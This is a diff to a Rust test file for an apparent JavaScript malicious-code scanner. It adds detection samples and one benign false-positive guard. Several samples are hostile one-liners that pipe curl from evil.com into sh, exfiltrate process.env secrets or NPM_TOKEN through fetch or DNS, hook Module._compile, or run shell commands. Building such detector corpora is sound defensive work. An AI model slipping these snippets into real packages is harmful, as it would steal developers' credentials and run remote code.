@@ -228,6 +228,67 @@ fn malicious_corpus() -> Vec<(&'static str, &'static str)> {
             "debugger anti-debug trap",
             r#"setInterval(()=>{debugger;},50);eval(atob("Y29uc29sZS5sb2coMSk="));"#,
         ),
+        // --- indirect execution / hidden channels ---
+        (
+            "aliased eval",
+            r#"const e = eval; e(atob("Y29uc29sZS5sb2coMSk="));"#,
+        ),
+        (
+            "Reflect.apply eval",
+            r#"Reflect.apply(eval, globalThis, ["console.log(1)"]);"#,
+        ),
+        (
+            "eval.call indirect",
+            r#"eval.call(globalThis, "require('child_process').exec('id')");"#,
+        ),
+        (
+            "process.nextTick eval",
+            r#"process.nextTick(eval, "console.log('pwned')");"#,
+        ),
+        (
+            "Function from array join",
+            r#"const fn = new Function(["return ", "process.env"].join("")); fn();"#,
+        ),
+        (
+            "String.fromCharCode spread into eval",
+            r#"const c = String.fromCharCode(...[101,118,97,108]); eval(c);"#,
+        ),
+        (
+            "module.require child_process",
+            r#"const cp = module.require("child_process"); cp.exec("curl http://evil.com/x.sh | sh");"#,
+        ),
+        (
+            "vm.compileFunction",
+            r#"const vm = require("vm"); const f = vm.compileFunction("return process.env"); f();"#,
+        ),
+        (
+            "dns.promises exfil",
+            r#"const dns = require("dns").promises; dns.resolve(process.env.SECRET + ".evil.tld");"#,
+        ),
+        (
+            "tls.connect with env exfil",
+            r#"const tls = require("tls"); tls.connect(443, "evil.tld", () => { fetch("https://evil.com?d=" + JSON.stringify(process.env)); });"#,
+        ),
+        (
+            "spawn shell:true",
+            r#"const { spawn } = require("child_process"); spawn("sh", ["-c", "curl http://evil.com/x.sh | sh"], { shell: true });"#,
+        ),
+        (
+            "Module._compile override",
+            r#"const Module = require("module"); Module.prototype._compile = function(code, filename) { fetch("https://evil.com?d=" + JSON.stringify(process.env)); return this._compile(code, filename); };"#,
+        ),
+        (
+            "WebAssembly.Module from base64",
+            r#"const b = "AGFzbQ=="; const mod = new WebAssembly.Module(Buffer.from(b, "base64"));"#,
+        ),
+        (
+            "process.env destructuring exfil",
+            r#"const { NPM_TOKEN } = process.env; fetch("https://evil.com", { body: NPM_TOKEN });"#,
+        ),
+        (
+            "dynamic require execSync",
+            r#"const mod = require(process.argv[2]); mod.execSync("id");"#,
+        ),
     ]
 }
 
@@ -394,6 +455,12 @@ fn benign_corpus() -> Vec<(&'static str, &'static str)> {
         (
             "husky git hook writer",
             r#"const fs=require('fs');fs.writeFileSync('.git/hooks/pre-commit','#!/bin/sh\nnpm test\n');fs.chmodSync('.git/hooks/pre-commit',0o755);"#,
+        ),
+        // FP guard for SC-057: plain process.env destructuring is the same
+        // low signal as dot access; without a nearby exfil sink it must stay clean.
+        (
+            "process.env destructuring no exfil",
+            r#"const { NODE_ENV, PORT } = process.env; console.log('running in', NODE_ENV, PORT);"#,
         ),
     ]
 }
